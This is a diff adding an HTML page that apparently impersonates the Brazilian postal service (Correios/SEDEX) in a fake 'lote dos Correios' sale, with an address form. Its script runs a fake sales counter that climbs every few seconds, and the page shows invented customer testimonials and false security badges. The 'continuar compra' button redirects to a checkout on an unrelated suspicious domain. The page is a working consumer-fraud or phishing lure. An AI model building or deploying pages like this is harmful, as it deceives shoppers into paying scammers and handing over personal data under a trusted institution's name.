@@ -1,0 +1,279 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="shortcut icon" href="images/short_icon.png" type="image/x-icon">
+    <link href="css/all.min.css" rel="stylesheet">
+    <title>Dados para entrega - Lote dos Correios - Site</title>
+</head>
+<body>
+    <div class="main-view">
+        <div class="top-header">
+           <div class="row">
+                <img src="images/caminhao_img.png" alt="">
+                <p>Preencha os seus<br>dados para entrega!</p>
+           </div>
+            <div class="bar-bottom"></div>
+        </div>
+        <div class="section">
+            
+            <div class="title-page">
+                <p> <span class="green-text">Comprando até:</span> <br>
+                    <span id="dataAtual">Quarta-feira, 25 de outubro de 2023</span><br>
+                    📦 Chegará em até <u>7 dias úteis</u><br>
+                   <span class="small">(incluindo regiões <span class="green-text">Norte e Nordeste</span> )</span> </p>
+            </div>
+            <p class="title-img">Entrega realizada por:</p>
+            <img class="logo-principal" src="images/logo_sedex.png" alt="">
+            <div class="form-field">
+                <div class="form">
+                    <div class="title-form">
+                        <div class="step-number">1</div>
+                        <div class="step-text">endereço</div>
+                    </div>
+                    <div class="inputs-field">
+                        <div class="group">
+                            <label for="name">cidade</label>
+                           <div class="input-group">
+                                <i class="fa-solid fa-city"></i>
+                                <input id="cidade" type="text" maxlength="25" value="" minlength="2" required="">
+                               
+                           </div>
+                        </div>
+                    </div>
+                    <div class="inputs-field">
+                        <div class="group">
+                            <label for="email">estado</label>
+                            <select id="estado" name="estado">
+                                <option value="AC">Acre</option>
+                                <option value="AL">Alagoas</option>
+                                <option value="AP">Amapá</option>
+                                <option value="AM">Amazonas</option>
+                                <option value="BA">Bahia</option>
+                                <option value="CE">Ceará</option>
+                                <option value="DF">Distrito Federal</option>
+                                <option value="ES">Espírito Santo</option>
+                                <option value="GO">Goiás</option>
+                                <option value="MA">Maranhão</option>
+                                <option value="MT">Mato Grosso</option>
+                                <option value="MS">Mato Grosso do Sul</option>
+                                <option value="MG">Minas Gerais</option>
+                                <option value="PA">Pará</option>
+                                <option value="PB">Paraíba</option>
+                                <option value="PR">Paraná</option>
+                                <option value="PE">Pernambuco</option>
+                                <option value="PI">Piauí</option>
+                                <option value="RJ">Rio de Janeiro</option>
+                                <option value="RN">Rio Grande do Norte</option>
+                                <option value="RS">Rio Grande do Sul</option>
+                                <option value="RO">Rondônia</option>
+                                <option value="RR">Roraima</option>
+                                <option value="SC">Santa Catarina</option>
+                                <option value="SP">São Paulo</option>
+                                <option value="SE">Sergipe</option>
+                                <option value="TO">Tocantins</option>
+                                <option value="EX">Estrangeiro</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="inputs-field">
+                        <div class="group">
+                            <label for="name">Rua</label>
+                           <div class="input-group">
+                            <i class="fa-solid fa-road"></i>
+                                <input id="rua" type="text" maxlength="25" value="" minlength="2" required="">
+                               
+                           </div>
+                        </div>
+                    </div>
+                    <div class="row-inputs">
+                        <div class="inputs-field">
+                            <div class="group">
+                                <label for="cep">cep</label>
+                               <div class="input-group">
+                                <i class="fa-solid fa-location-dot"></i>
+                                    <input id="cep" type="text" value="" maxlength="9" required="">
+                               </div>
+                            </div>
+                        </div>
+                        <div class="inputs-field">
+                            <div class="group">
+                                <label for="rua">bairro</label>
+                               <div class="input-group">
+                                
+                                    <input id="bairro" type="text" value="" maxlength="25" required="">
+                               </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row-inputs">
+                        <div class="inputs-field">
+                            <div class="group">
+                                <label for="cpf">N°</label>
+                               <div class="input-group">
+                                
+                                    <input id="numero" type="text" value="" maxlength="15" required="">
+                               </div>
+                            </div>
+                        </div>
+                        <div class="inputs-field">
+                            <div class="group">
+                                <label for="complemento">complemento</label>
+                               <div class="input-group">
+                               
+                                    <input id="complemento" type="text" value="" maxlength="6" required="">
+                               </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+            </div>
+            <div class="btn-field">
+                <button class="btn-continuar" id="btn">continuar compra <i class="fa-solid fa-arrow-right"></i></button>
+            </div>
+            <div class="info-sales">
+                <p><span id="sales">1535</span> pessoas compraram nessa semana!</p>
+            </div>
+    
+            <div class="comentarios-field">
+                <div class="comentario-container">
+                    <div class="comentario-user-info">
+                        <div class="user-img">
+                            <img src="images/img_user1.jpg" alt="">
+                        </div>
+                        <div class="name-user">
+                            <p>Roberta Laureano</p>
+                            <span>⭐⭐⭐⭐⭐</span>
+                        </div>
+                    </div>
+                    <div class="line"></div>
+                    <div class="comentario-user-text">
+                        <p>Site muito confiável! Recebi meu lote em 7 dias, veio um iPhone 12, um fone de ouvido e um Tablet que vou dar pro meu filho</p>
+                    </div>
+                </div>
+                <div class="comentario-container">
+                    <div class="comentario-user-info">
+                        <div class="user-img">
+                            <img src="images/img_user2.jpg" alt="">
+                        </div>
+                        <div class="name-user">
+                            <p>Hudson Godoy</p>
+                            <span>⭐⭐⭐⭐⭐</span>
+                        </div>
+                    </div>
+                    <div class="line"></div>
+                    <div class="comentario-user-text">
+                        <p>Muito bom, achei que não daria certo mas chegou bem rápido aqui em casa. Veio um Notebook da Samsung que custa R$3.500 e eu paguei apenas 159.90... Hahah, show!</p>
+                    </div>
+                </div>
+                <div class="comentario-container">
+                    <div class="comentario-user-info">
+                        <div class="user-img">
+                            <img src="images/img_user3.jpg" alt="">
+                        </div>
+                        <div class="name-user">
+                            <p>Márcia Almeida</p>
+                            <span>⭐⭐⭐⭐⭐</span>
+                        </div>
+                    </div>
+                    <div class="line"></div>
+                    <div class="comentario-user-text">
+                        <p>Chegou tudo certo e rápido demais, recomendo!</p>
+                    </div>
+                </div>
+            </div>
+            <div class="more-coments">
+                <p>Mais 136 comentários</p>
+            </div>
+        </div>
+        <div class="rodape">
+            <div class="row-info">
+                <p><i class="fa-solid fa-lock"></i>Compra segura</p>
+                <p><i class="fa-solid fa-shield"></i>Dados protegidos</p>
+            </div>
+            <p class="small">Compra processada por Pepper © 2023 - Todos os direitos reservados. *Taxa de 2,99% a.m.</p>
+        </div>
+    </div>
+    <script src="js/axios.min.js"></script>
+    <script>
+        const sales = document.getElementById('sales')
+        var numero = 1557 ;
+        
+        function ContadorDeNumeros(){
+            numero++
+            sales.innerHTML  = numero
+            
+        }
+        
+        setInterval(ContadorDeNumeros, 3500);
+        
+        const cepFormat = document.getElementById('cep');
+        cepFormat.addEventListener('input', () => {
+            let inputLength = cepFormat.value.length;
+            
+
+            let texto = cepFormat.value.replace(/\D/g, '');
+            let formatado = texto.replace(/(\d{0,5})(\d{0,3})/, function (match, group1, group2) {
+                return group1 + (group2 ? '-' : '') + group2;
+            });
+
+            cepFormat.value = formatado;
+            consultarcep(formatado)
+        });
+        
+        async function consultarcep(cep){
+            try {
+                if(cep.length !== 9) return;
+                const {data} = await axios.get(`https://viacep.com.br/ws/${cep}/json`)
+                if(!data) return;
+                document.getElementById('cidade').value = data.localidade
+                document.getElementById('estado').value = data.uf
+                document.getElementById('bairro').value = data.bairro
+                document.getElementById('rua').value = data.logradouro   
+                document.getElementById('complemento').value = data.complemento || 'N/A'
+            } catch (error) {
+                return;
+            }
+        }
+    
+        function obterNomeDiaSemana(diaSemana) {
+            const diasSemana = [
+            "Domingo", "Segunda-feira", "Terça-feira", "Quarta-feira",
+            "Quinta-feira", "Sexta-feira", "Sábado"
+            ];
+
+            return diasSemana[diaSemana];
+        }
+
+        function formatarData(data) {
+            const meses = [
+            "janeiro", "fevereiro", "março", "abril",
+            "maio", "junho", "julho", "agosto",
+            "setembro", "outubro", "novembro", "dezembro"
+            ];
+
+            const diaSemana = obterNomeDiaSemana(data.getDay());
+            const dia = data.getDate();
+            const mes = meses[data.getMonth()];
+            const ano = data.getFullYear();
+            console.log(`${dia}/${data.getMonth()}/${ano}`)
+            return `${diaSemana}, ${dia} de ${mes} de ${ano}`;
+        }
+
+        const dataAtual = new Date();
+
+        const dataFormatada = formatarData(dataAtual);
+
+        document.getElementById("dataAtual").innerHTML = dataFormatada;
+        function prosseguir() {
+
+            const novaURL = "https://sitehomologadoficial.space/brb-leilao/fb-gru/checkout-24990/";
+            window.location.href = novaURL;
+        }
+
+    const botaoProsseguir = document.getElementById("btn");
+    botaoProsseguir.addEventListener("click", prosseguir);
+    </script>
+
+</div></body></html>
